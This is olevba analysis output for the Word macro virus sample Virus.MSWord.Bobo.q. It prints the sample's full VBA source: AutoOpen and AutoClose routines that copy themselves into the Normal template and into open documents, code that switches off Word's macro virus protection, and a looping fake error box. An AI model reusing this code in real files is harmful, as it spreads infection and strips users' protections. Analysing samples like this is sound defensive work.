olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bobo.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bobo.q - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CAPUT.bas 
in file: Virus.MSWord.Bobo.q - OLE stream: 'Macros/VBA/CAPUT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Ìàêðîñ ñîçäàí 17.11.00 v22-09"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoOpen"
    Dim x1, x2 As Boolean
    x1 = False
    x2 = False
    
    For Each xitem In ActiveDocument.VBProject.VBComponents
        If xitem.Name = "CAPUT" Then x1 = True
    Next xitem
    
    For Each xitem In NormalTemplate.VBProject.VBComponents
        If xitem.Name = "CAPUT" Then x2 = True
    Next xitem
    
    If x1 = True And x2 = True Then GoTo nex1
    If x1 = True Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="CAPUT", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.Save
        Exit Sub
    End If
    Application.OrganizerCopy Destination:=ActiveDocument.FullName, Source:=NormalTemplate.FullName, Name:="CAPUT", Object:=wdOrganizerObjectProjectItems
nex1:
    With ActiveWindow
        With Options
            .VirusProtection = False
        End With
        With Options
            .SaveNormalPrompt = False
        End With
    End With
End Sub
Sub ToolsMacro()
nex1:
    WordBasic.Beep
    x = MsgBox("Íåïðåäâèäåííàÿ îøèáêà: íåâîçìîæíî îòêðûòü vbm32ms.dll", 21, "Error")
    If x = 4 Then GoTo nex1
End Sub
Sub AutoExec()
    
End Sub
Sub AutoClose()
    For Each xitem In ActiveDocument.VBProject.VBComponents
        If xitem.Name = "CAPUT" Then Exit Sub
    Next xitem
    Application.OrganizerCopy Destination:=ActiveDocument.FullName, Source:=NormalTemplate.FullName, Name:="CAPUT", Object:=wdOrganizerObjectProjectItems
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vbm32ms.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

